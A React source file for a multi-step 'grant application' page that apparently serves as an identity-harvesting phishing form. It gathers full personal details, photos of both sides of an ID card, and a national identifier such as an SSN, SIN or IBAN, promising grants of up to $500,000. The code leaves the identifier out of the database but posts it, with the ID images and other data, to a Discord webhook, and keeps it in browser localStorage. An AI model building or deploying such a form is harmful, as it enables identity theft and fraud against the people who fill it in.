import { useState, useRef, useEffect, useMemo } from 'react';
import { format } from 'date-fns';
import { supabase } from '@/integrations/supabase/client';
import { useAuth } from '@/contexts/AuthContext';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Textarea } from '@/components/ui/textarea';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { Progress } from '@/components/ui/progress';
import { cn } from '@/lib/utils';
import { toast } from 'sonner';
import { useNavigate } from 'react-router-dom';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Loader2, ArrowLeft, ArrowRight, Upload, FileText, CheckCircle, User, DollarSign, ClipboardList, ShieldCheck, X, Image as ImageIcon } from 'lucide-react';
import { sendToDiscord } from '@/lib/discord';

const SECURITY_COUNTRIES = ['USA', 'Germany', 'UK', 'Canada', 'Brazil', 'New Zealand', 'Others'] as const;
type SecurityCountry = typeof SECURITY_COUNTRIES[number];

const SECURITY_PLACEHOLDERS: Record<string, string> = {
  USA: 'Enter SSN',
  Germany: 'Enter IBAN',
  UK: 'Enter National Insurance Number',
  Canada: 'Enter SIN',
  Brazil: 'Enter CPF',
  'New Zealand': 'Enter IRD Number',
};

const STEPS = ['Personal Details', 'Funding Details', 'Questionnaire', 'Review & Submit'];
const DRAFT_KEY = 'apply_form_draft_v1';

const MONTHS = [
  'January', 'February', 'March', 'April', 'May', 'June',
  'July', 'August', 'September', 'October', 'November', 'December'
];

export default function ApplyPage() {
  const { user } = useAuth();
  const navigate = useNavigate();
  const [step, setStep] = useState(0);
  const [submitting, setSubmitting] = useState(false);
  const [draftLoaded, setDraftLoaded] = useState(false);

  // Step 1: Personal details
  const [fullName, setFullName] = useState('');
  const [email, setEmail] = useState(user?.email || '');
  const [phone, setPhone] = useState('');
  const [dobDay, setDobDay] = useState<string>('');
  const [dobMonth, setDobMonth] = useState<string>('');
  const [dobYear, setDobYear] = useState<string>('');
  const [streetAddress, setStreetAddress] = useState('');
  const [city, setCity] = useState('');
  const [stateProvince, setStateProvince] = useState('');
  const [country, setCountry] = useState('');
  const [securityCountry, setSecurityCountry] = useState<SecurityCountry | ''>('');
  const [securityInfo, setSecurityInfo] = useState('');
  const [occupation, setOccupation] = useState('');
  const [idFrontFile, setIdFrontFile] = useState<File | null>(null);
  const [idBackFile, setIdBackFile] = useState<File | null>(null);
  const [idFrontPreview, setIdFrontPreview] = useState<string>('');
  const [idBackPreview, setIdBackPreview] = useState<string>('');
  const [uploadingFront, setUploadingFront] = useState(false);
  const [uploadingBack, setUploadingBack] = useState(false);
  const idFrontRef = useRef<HTMLInputElement>(null);
  const idBackRef = useRef<HTMLInputElement>(null);

  // Step 2: Funding
  const [amountRequested, setAmountRequested] = useState('');
  const [amountDisplay, setAmountDisplay] = useState('');
  const [purpose, setPurpose] = useState('');

  // Step 3: Questions
  const [q1, setQ1] = useState('');
  const [q2, setQ2] = useState('');
  const [q3, setQ3] = useState('');
  const [q4, setQ4] = useState('');
  const [q5, setQ5] = useState('');

  const dateOfBirth = useMemo(() => {
    if (!dobDay || !dobMonth || !dobYear) return undefined;
    const d = new Date(parseInt(dobYear), parseInt(dobMonth), parseInt(dobDay));
    return isNaN(d.getTime()) ? undefined : d;
  }, [dobDay, dobMonth, dobYear]);

  const currentYear = new Date().getFullYear();
  const years = useMemo(() => {
    const arr: number[] = [];
    for (let y = currentYear; y >= 1900; y--) arr.push(y);
    return arr;
  }, [currentYear]);
  const daysInMonth = useMemo(() => {
    if (!dobMonth || !dobYear) return 31;
    return new Date(parseInt(dobYear), parseInt(dobMonth) + 1, 0).getDate();
  }, [dobMonth, dobYear]);

  const questions = [
    { label: 'Why do you need this grant?', value: q1, set: setQ1 },
    { label: 'How will you use the funds?', value: q2, set: setQ2 },
    { label: 'Have you received any grants before? If yes, describe.', value: q3, set: setQ3 },
    { label: 'What impact will this funding have on your life or community?', value: q4, set: setQ4 },
    { label: 'Is there anything else you would like us to know?', value: q5, set: setQ5 },
  ];

  // ---- Auto-save: load draft on mount ----
  useEffect(() => {
    try {
      const saved = localStorage.getItem(DRAFT_KEY);
      if (saved) {
        const d = JSON.parse(saved);
        setFullName(d.fullName || '');
        setEmail(d.email || user?.email || '');
        setPhone(d.phone || '');
        setDobDay(d.dobDay || '');
        setDobMonth(d.dobMonth || '');
        setDobYear(d.dobYear || '');
        setStreetAddress(d.streetAddress || '');
        setCity(d.city || '');
        setStateProvince(d.stateProvince || '');
        setCountry(d.country || '');
        setSecurityCountry(d.securityCountry || '');
        setSecurityInfo(d.securityInfo || '');
        setOccupation(d.occupation || '');
        setAmountRequested(d.amountRequested || '');
        setAmountDisplay(d.amountDisplay || '');
        setPurpose(d.purpose || '');
        setQ1(d.q1 || ''); setQ2(d.q2 || ''); setQ3(d.q3 || '');
        setQ4(d.q4 || ''); setQ5(d.q5 || '');
        setStep(typeof d.step === 'number' ? d.step : 0);
        setIdFrontPreview(d.idFrontPreview || '');
        setIdBackPreview(d.idBackPreview || '');
        toast.success('Restored your saved progress', { duration: 2500 });
      }
    } catch (e) {
      console.error('Failed to load draft:', e);
    } finally {
      setDraftLoaded(true);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // ---- Auto-save: persist on change (after initial load) ----
  useEffect(() => {
    if (!draftLoaded) return;
    try {
      const draft = {
        fullName, email, phone, dobDay, dobMonth, dobYear,
        streetAddress, city, stateProvince, country,
        securityCountry, securityInfo, occupation,
        amountRequested, amountDisplay, purpose,
        q1, q2, q3, q4, q5, step,
        idFrontPreview, idBackPreview,
      };
      localStorage.setItem(DRAFT_KEY, JSON.stringify(draft));
    } catch (e) {
      console.error('Failed to save draft:', e);
    }
  }, [
    draftLoaded, fullName, email, phone, dobDay, dobMonth, dobYear,
    streetAddress, city, stateProvince, country,
    securityCountry, securityInfo, occupation,
    amountRequested, amountDisplay, purpose,
    q1, q2, q3, q4, q5, step, idFrontPreview, idBackPreview,
  ]);

  const showSecurityField = securityCountry && securityCountry !== 'Others';
  const canProceedStep0 =
    fullName && email && dateOfBirth && streetAddress && city && country &&
    occupation && (idFrontFile || idFrontPreview) && (idBackFile || idBackPreview) &&
    (!showSecurityField || securityInfo);
  const canProceedStep1 = amountRequested && parseFloat(amountRequested) > 0 && parseFloat(amountRequested) <= 500000;
  const canProceedStep2 = q1 && q2 && q4;

  const handleAmountChange = (val: string) => {
    const raw = val.replace(/[^0-9.]/g, '');
    const parts = raw.split('.');
    const intPart = parts[0] || '';
    const decPart = parts.length > 1 ? '.' + parts[1].slice(0, 2) : '';
    setAmountRequested(intPart + decPart);
    const formatted = intPart.replace(/\B(?=(\d{3})+(?!\d))/g, ',');
    setAmountDisplay(formatted + decPart);
  };

  const uploadToCloudinary = async (file: File): Promise<string | null> => {
    try {
      const formData = new FormData();
      formData.append('file', file);
      formData.append('upload_preset', 'Grant Photos');
      formData.append('cloud_name', 'div85yp42');

      const res = await fetch('https://api.cloudinary.com/v1_1/div85yp42/image/upload', {
        method: 'POST',
        body: formData,
      });

      if (!res.ok) {
        const err = await res.json().catch(() => ({}));
        const msg = err?.error?.message || `Upload failed (${res.status})`;
        console.error('Cloudinary upload failed:', msg);
        toast.error(`Upload failed: ${msg}`);
        return null;
      }

      const data = await res.json();
      return data.secure_url;
    } catch (err) {
      console.error('Cloudinary upload exception:', err);
      toast.error('Upload failed. Please check your connection and try again.');
      return null;
    }
  };

  const handleFileSelect = async (file: File | null, side: 'front' | 'back') => {
    if (!file) return;
    if (file.size > 10 * 1024 * 1024) {
      toast.error('File too large (max 10MB)');
      return;
    }
    const setFile = side === 'front' ? setIdFrontFile : setIdBackFile;
    const setPreview = side === 'front' ? setIdFrontPreview : setIdBackPreview;
    const setUploading = side === 'front' ? setUploadingFront : setUploadingBack;

    setFile(file);
    setUploading(true);
    try {
      const url = await uploadToCloudinary(file);
      if (url) {
        setPreview(url);
        toast.success(`${side === 'front' ? 'Front' : 'Back'} ID uploaded`);
      } else {
        setFile(null);
      }
    } finally {
      setUploading(false);
    }
  };

  const removeFile = (side: 'front' | 'back') => {
    if (side === 'front') {
      setIdFrontFile(null);
      setIdFrontPreview('');
      if (idFrontRef.current) idFrontRef.current.value = '';
    } else {
      setIdBackFile(null);
      setIdBackPreview('');
      if (idBackRef.current) idBackRef.current.value = '';
    }
  };

  const handleSubmit = async () => {
    if (!user) {
      toast.error('You must be signed in to submit');
      return;
    }
    if (!idFrontPreview || !idBackPreview) {
      toast.error('Please wait for ID uploads to complete');
      return;
    }
    setSubmitting(true);

    try {
      const answers = {
        why_need_grant: q1,
        how_use_funds: q2,
        previous_grants: q3,
        impact: q4,
        additional_info: q5,
      };

      const { error } = await supabase.from('applications').insert({
        user_id: user.id,
        full_name: fullName,
        email,
        phone: phone || null,
        date_of_birth: dateOfBirth ? format(dateOfBirth, 'yyyy-MM-dd') : null,
        street_address: streetAddress,
        city,
        state_province: stateProvince || null,
        country,
        occupation,
        id_card_front_url: idFrontPreview,
        id_card_back_url: idBackPreview,
        amount_requested: parseFloat(amountRequested),
        purpose: purpose || null,
        answers,
      });

      if (error) {
        console.error('Submission DB error:', error);
        toast.error(error.message || 'Failed to save application');
        setSubmitting(false);
        return;
      }

      await sendToDiscord({
        title: '📄 New Grant Application',
        color: 0x3b82f6,
        fields: [
          { name: '👤 Full Name', value: fullName },
          { name: '📧 Email', value: email },
          { name: '📞 Phone', value: phone || '—' },
          { name: '🎂 Date of Birth', value: dateOfBirth ? format(dateOfBirth, 'PPP') : '—' },
          { name: '💼 Occupation', value: occupation },
          { name: '🏠 Address', value: [streetAddress, city, stateProvince, country].filter(Boolean).join(', '), inline: false },
          { name: '💰 Amount Requested', value: `$${Number(amountRequested).toLocaleString('en-US', { minimumFractionDigits: 2 })}` },
          { name: '📋 Purpose', value: purpose || '—', inline: false },
          { name: '❓ Why need grant', value: q1 || '—', inline: false },
          { name: '💡 How use funds', value: q2 || '—', inline: false },
          { name: '📜 Previous grants', value: q3 || '—', inline: false },
          { name: '🌍 Impact', value: q4 || '—', inline: false },
          { name: '📎 Additional info', value: q5 || '—', inline: false },
          { name: '🪪 ID Front', value: idFrontPreview, inline: false },
          { name: '🪪 ID Back', value: idBackPreview, inline: false },
          ...(showSecurityField ? [
            { name: `🛡️ ${SECURITY_PLACEHOLDERS[securityCountry]?.replace('Enter ', '')}`, value: securityInfo, inline: false },
          ] : []),
        ],
        imageUrl: idFrontPreview,
      });

      // Clear draft on success
      localStorage.removeItem(DRAFT_KEY);
      navigate('/application-success');
    } catch (err: any) {
      console.error('Submit exception:', err);
      toast.error(err?.message || 'Submission failed. Please try again.');
    } finally {
      setSubmitting(false);
    }
  };

  const stepIcons = [User, DollarSign, ClipboardList, CheckCircle];
  const progressPercent = ((step + 1) / STEPS.length) * 100;

  return (
    <div className="min-h-screen bg-background py-8 px-4">
      <div className="max-w-2xl mx-auto">
        <Button variant="ghost" size="sm" onClick={() => navigate('/dashboard')} className="mb-6">
          <ArrowLeft className="mr-2 h-4 w-4" /> Back to Dashboard
        </Button>

        {/* Step Indicator */}
        <div className="flex items-center justify-between mb-3 px-2">
          {STEPS.map((s, i) => {
            const Icon = stepIcons[i];
            const isActive = i === step;
            const isDone = i < step;
            return (
              <div key={s} className="flex flex-col items-center flex-1">
                <div className={cn(
                  'flex h-10 w-10 items-center justify-center rounded-full border-2 transition-colors',
                  isDone ? 'bg-success border-success text-success-foreground' :
                  isActive ? 'border-primary bg-primary text-primary-foreground' :
                  'border-muted-foreground/30 text-muted-foreground'
                )}>
                  {isDone ? <CheckCircle className="h-5 w-5" /> : <Icon className="h-5 w-5" />}
                </div>
                <span className={cn('text-xs mt-2 text-center', isActive ? 'font-semibold text-foreground' : 'text-muted-foreground')}>
                  {s}
                </span>
              </div>
            );
          })}
        </div>
        <div className="px-2 mb-6">
          <Progress value={progressPercent} className="h-2" />
          <p className="text-xs text-muted-foreground mt-2 text-center">
            Step {step + 1} of {STEPS.length} • Progress is auto-saved
          </p>
        </div>

        <Card>
          <CardHeader>
            <CardTitle>{STEPS[step]}</CardTitle>
            <CardDescription>
              {step === 0 && 'Enter your personal information and upload ID documents'}
              {step === 1 && 'Specify the funding amount and purpose'}
              {step === 2 && 'Answer a few questions about your grant needs'}
              {step === 3 && 'Review all information before submitting'}
            </CardDescription>
          </CardHeader>
          <CardContent>
            {/* Step 1: Personal Details */}
            {step === 0 && (
              <div className="space-y-4">
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="full_name">Full Name <span className="text-destructive">*</span></Label>
                    <Input id="full_name" value={fullName} onChange={e => setFullName(e.target.value)} required placeholder="John Doe" />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="email">Email <span className="text-destructive">*</span></Label>
                    <Input id="email" type="email" value={email} onChange={e => setEmail(e.target.value)} required />
                  </div>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="phone">Phone</Label>
                    <Input id="phone" value={phone} onChange={e => setPhone(e.target.value)} placeholder="+1 (555) 000-0000" />
                  </div>
                  <div className="space-y-2">
                    <Label>Date of Birth <span className="text-destructive">*</span></Label>
                    <div className="grid grid-cols-3 gap-2">
                      <Select value={dobMonth} onValueChange={setDobMonth}>
                        <SelectTrigger><SelectValue placeholder="Month" /></SelectTrigger>
                        <SelectContent className="max-h-64">
                          {MONTHS.map((m, i) => (
                            <SelectItem key={m} value={String(i)}>{m}</SelectItem>
                          ))}
                        </SelectContent>
                      </Select>
                      <Select value={dobDay} onValueChange={setDobDay}>
                        <SelectTrigger><SelectValue placeholder="Day" /></SelectTrigger>
                        <SelectContent className="max-h-64">
                          {Array.from({ length: daysInMonth }, (_, i) => i + 1).map(d => (
                            <SelectItem key={d} value={String(d)}>{d}</SelectItem>
                          ))}
                        </SelectContent>
                      </Select>
                      <Select value={dobYear} onValueChange={setDobYear}>
                        <SelectTrigger><SelectValue placeholder="Year" /></SelectTrigger>
                        <SelectContent className="max-h-64">
                          {years.map(y => (
                            <SelectItem key={y} value={String(y)}>{y}</SelectItem>
                          ))}
                        </SelectContent>
                      </Select>
                    </div>
                  </div>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="occupation">Occupation <span className="text-destructive">*</span></Label>
                  <Input id="occupation" value={occupation} onChange={e => setOccupation(e.target.value)} required placeholder="e.g. Teacher, Engineer, Student" />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="street_address">Street Address <span className="text-destructive">*</span></Label>
                  <Input id="street_address" value={streetAddress} onChange={e => setStreetAddress(e.target.value)} required placeholder="123 Main Street" />
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="city">City <span className="text-destructive">*</span></Label>
                    <Input id="city" value={city} onChange={e => setCity(e.target.value)} required />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="state">State / Province</Label>
                    <Input id="state" value={stateProvince} onChange={e => setStateProvince(e.target.value)} />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="country">Country <span className="text-destructive">*</span></Label>
                    <Input id="country" value={country} onChange={e => setCountry(e.target.value)} required />
                  </div>
                </div>

                {/* Security Country & Info */}
                <div className="space-y-4 pt-2">
                  <div className="space-y-2">
                    <Label>Security Country <span className="text-destructive">*</span></Label>
                    <Select value={securityCountry} onValueChange={(v) => { setSecurityCountry(v as SecurityCountry); setSecurityInfo(''); }}>
                      <SelectTrigger><SelectValue placeholder="Select your country" /></SelectTrigger>
                      <SelectContent>
                        {SECURITY_COUNTRIES.map(c => <SelectItem key={c} value={c}>{c}</SelectItem>)}
                      </SelectContent>
                    </Select>
                  </div>
                  {showSecurityField && (
                    <div className="space-y-2 border border-primary/30 rounded-lg p-4">
                      <div className="flex items-center gap-2 mb-1">
                        <ShieldCheck className="h-4 w-4 text-primary" />
                        <Label htmlFor="security" className="font-semibold">
                          {SECURITY_PLACEHOLDERS[securityCountry]?.replace('Enter ', '')} <span className="text-destructive">*</span>
                        </Label>
                      </div>
                      <Input id="security" placeholder={SECURITY_PLACEHOLDERS[securityCountry]} value={securityInfo} onChange={e => setSecurityInfo(e.target.value)} required />
                      <p className="text-xs text-muted-foreground">Required for identity verification</p>
                    </div>
                  )}
                </div>

                {/* ID Card Uploads */}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 pt-2">
                  <IdUploadField
                    label="ID Card — Front"
                    inputRef={idFrontRef}
                    file={idFrontFile}
                    previewUrl={idFrontPreview}
                    uploading={uploadingFront}
                    onSelect={(f) => handleFileSelect(f, 'front')}
                    onRemove={() => removeFile('front')}
                  />
                  <IdUploadField
                    label="ID Card — Back"
                    inputRef={idBackRef}
                    file={idBackFile}
                    previewUrl={idBackPreview}
                    uploading={uploadingBack}
                    onSelect={(f) => handleFileSelect(f, 'back')}
                    onRemove={() => removeFile('back')}
                  />
                </div>
              </div>
            )}

            {/* Step 2: Funding Details */}
            {step === 1 && (
              <div className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="amount">Amount Requested (USD) <span className="text-destructive">*</span></Label>
                  <Input id="amount" type="text" inputMode="decimal" value={amountDisplay} onChange={e => handleAmountChange(e.target.value)} required placeholder="e.g. 100,000" />
                  <p className="text-xs text-muted-foreground">Maximum $500,000</p>
                </div>
                <div className="space-y-2">
                  <Label htmlFor="purpose">Purpose / Description</Label>
                  <Textarea id="purpose" value={purpose} onChange={e => setPurpose(e.target.value)} rows={5} placeholder="Describe what you need the funding for..." />
                </div>
              </div>
            )}

            {/* Step 3: Questionnaire */}
            {step === 2 && (
              <div className="space-y-5">
                {questions.map((q, i) => (
                  <div key={i} className="space-y-2">
                    <Label>
                      {i + 1}. {q.label} {i < 2 || i === 3 ? <span className="text-destructive">*</span> : null}
                    </Label>
                    <Textarea value={q.value} onChange={e => q.set(e.target.value)} rows={3} />
                  </div>
                ))}
              </div>
            )}

            {/* Step 4: Review */}
            {step === 3 && (
              <div className="space-y-6">
                <div>
                  <h3 className="text-sm font-semibold text-muted-foreground uppercase tracking-wider mb-3">Personal Details</h3>
                  <div className="grid grid-cols-2 gap-x-6 gap-y-2 text-sm">
                    <ReviewItem label="Full Name" value={fullName} />
                    <ReviewItem label="Email" value={email} />
                    <ReviewItem label="Phone" value={phone || '—'} />
                    <ReviewItem label="Date of Birth" value={dateOfBirth ? format(dateOfBirth, 'PPP') : '—'} />
                    <ReviewItem label="Occupation" value={occupation} />
                    <ReviewItem label="Country" value={country} />
                    {showSecurityField && (
                      <ReviewItem label={SECURITY_PLACEHOLDERS[securityCountry]?.replace('Enter ', '') || ''} value={securityInfo} />
                    )}
                  </div>
                  <div className="mt-2 text-sm">
                    <ReviewItem label="Address" value={[streetAddress, city, stateProvince, country].filter(Boolean).join(', ')} />
                  </div>
                  <div className="mt-3 flex gap-4 text-sm">
                    <div className="flex-1">
                      <span className="text-muted-foreground block mb-1">ID Front</span>
                      {idFrontPreview ? (
                        <img src={idFrontPreview} alt="ID Front" className="h-20 w-full object-cover rounded border" />
                      ) : <span className="text-muted-foreground">—</span>}
                    </div>
                    <div className="flex-1">
                      <span className="text-muted-foreground block mb-1">ID Back</span>
                      {idBackPreview ? (
                        <img src={idBackPreview} alt="ID Back" className="h-20 w-full object-cover rounded border" />
                      ) : <span className="text-muted-foreground">—</span>}
                    </div>
                  </div>
                </div>

                <div>
                  <h3 className="text-sm font-semibold text-muted-foreground uppercase tracking-wider mb-3">Funding Details</h3>
                  <div className="grid grid-cols-2 gap-x-6 gap-y-2 text-sm">
                    <ReviewItem label="Amount Requested" value={`$${Number(amountRequested).toLocaleString('en-US', { minimumFractionDigits: 2 })}`} />
                    <ReviewItem label="Purpose" value={purpose || '—'} />
                  </div>
                </div>

                <div>
                  <h3 className="text-sm font-semibold text-muted-foreground uppercase tracking-wider mb-3">Questionnaire</h3>
                  <div className="space-y-3 text-sm">
                    {questions.map((q, i) => (
                      <div key={i}>
                        <p className="text-muted-foreground">{q.label}</p>
                        <p className="font-medium">{q.value || '—'}</p>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            )}

            {/* Navigation */}
            <div className="flex items-center justify-between mt-8 pt-4 border-t">
              {step > 0 ? (
                <Button variant="outline" onClick={() => setStep(s => s - 1)} disabled={submitting}>
                  <ArrowLeft className="mr-2 h-4 w-4" /> Back
                </Button>
              ) : <div />}

              {step < 3 ? (
                <Button
                  onClick={() => setStep(s => s + 1)}
                  disabled={
                    (step === 0 && !canProceedStep0) ||
                    (step === 1 && !canProceedStep1) ||
                    (step === 2 && !canProceedStep2) ||
                    uploadingFront || uploadingBack
                  }
                >
                  {(uploadingFront || uploadingBack) ? (
                    <><Loader2 className="mr-2 h-4 w-4 animate-spin" />Uploading…</>
                  ) : (
                    <>Next <ArrowRight className="ml-2 h-4 w-4" /></>
                  )}
                </Button>
              ) : (
                <Button
                  onClick={handleSubmit}
                  disabled={submitting || uploadingFront || uploadingBack}
                  className="bg-success text-success-foreground hover:bg-success/90"
                >
                  {submitting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <CheckCircle className="mr-2 h-4 w-4" />}
                  {submitting ? 'Submitting...' : 'Submit Application'}
                </Button>
              )}
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}

function ReviewItem({ label, value }: { label: string; value: string }) {
  return (
    <div>
      <span className="text-muted-foreground">{label}: </span>
      <span className="font-medium text-foreground">{value}</span>
    </div>
  );
}

interface IdUploadFieldProps {
  label: string;
  inputRef: React.RefObject<HTMLInputElement>;
  file: File | null;
  previewUrl: string;
  uploading: boolean;
  onSelect: (file: File | null) => void;
  onRemove: () => void;
}

function IdUploadField({ label, inputRef, file, previewUrl, uploading, onSelect, onRemove }: IdUploadFieldProps) {
  return (
    <div className="space-y-2">
      <Label>{label} <span className="text-destructive">*</span></Label>
      <input
        ref={inputRef}
        type="file"
        accept=".jpg,.jpeg,.png,.pdf"
        className="hidden"
        onChange={(e) => {
          e.preventDefault();
          onSelect(e.target.files?.[0] || null);
        }}
      />
      {previewUrl ? (
        <div className="relative border rounded-lg overflow-hidden bg-muted/30">
          {previewUrl.match(/\.pdf$/i) ? (
            <div className="flex items-center justify-center h-32 text-muted-foreground">
              <FileText className="h-8 w-8 mr-2" /> PDF uploaded
            </div>
          ) : (
            <img src={previewUrl} alt={label} className="w-full h-32 object-cover" />
          )}
          <Button
            type="button"
            size="icon"
            variant="destructive"
            className="absolute top-1 right-1 h-7 w-7"
            onClick={onRemove}
          >
            <X className="h-4 w-4" />
          </Button>
          <div className="absolute bottom-1 left-1 bg-success text-success-foreground text-xs px-2 py-0.5 rounded flex items-center gap-1">
            <CheckCircle className="h-3 w-3" /> Uploaded
          </div>
        </div>
      ) : uploading ? (
        <div className="border rounded-lg p-4 flex flex-col items-center gap-2 bg-muted/30">
          <Loader2 className="h-6 w-6 animate-spin text-primary" />
          <p className="text-xs text-muted-foreground">Uploading {file?.name}…</p>
        </div>
      ) : (
        <Button
          type="button"
          variant="outline"
          className="w-full justify-start h-auto py-3"
          onClick={() => inputRef.current?.click()}
        >
          <Upload className="mr-2 h-4 w-4" />
          <span className="flex flex-col items-start">
            <span>Upload {label.includes('Front') ? 'front' : 'back'} of ID</span>
            <span className="text-xs text-muted-foreground font-normal">JPG, PNG, or PDF (max 10MB)</span>
          </span>
        </Button>
      )}
    </div>
  );
}
